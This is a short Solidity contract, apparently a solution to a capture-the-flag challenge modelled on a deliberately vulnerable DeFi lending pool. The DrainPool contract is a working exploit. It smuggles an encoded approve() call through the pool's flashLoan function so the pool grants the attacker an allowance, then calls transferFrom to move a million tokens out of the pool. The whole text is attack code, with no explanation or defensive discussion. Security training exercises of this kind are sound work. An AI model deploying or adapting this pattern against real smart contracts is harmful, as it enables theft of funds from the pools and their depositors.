// This contract was in the same file as the others from the challenge, so it's
// missing imports, etc.

contract DrainPool {

    IERC20 public damnValuableToken = IERC20(0x2aC875AB4C170C859052805725a1Fc0b6Aed092F);
    TrusterLenderPool pool = TrusterLenderPool(0x0b99d869514370c9aA98bB5DacAC2d95d1aF235B);

    function drainPool() public {
        bytes memory _call = abi.encodeWithSignature("approve(address,uint256)", address(this), 1000000000000000000000000);
        pool.flashLoan(0, address(this), address(damnValuableToken), _call);
        damnValuableToken.transferFrom(address(pool), address(this), 1000000000000000000000000);
    }
}
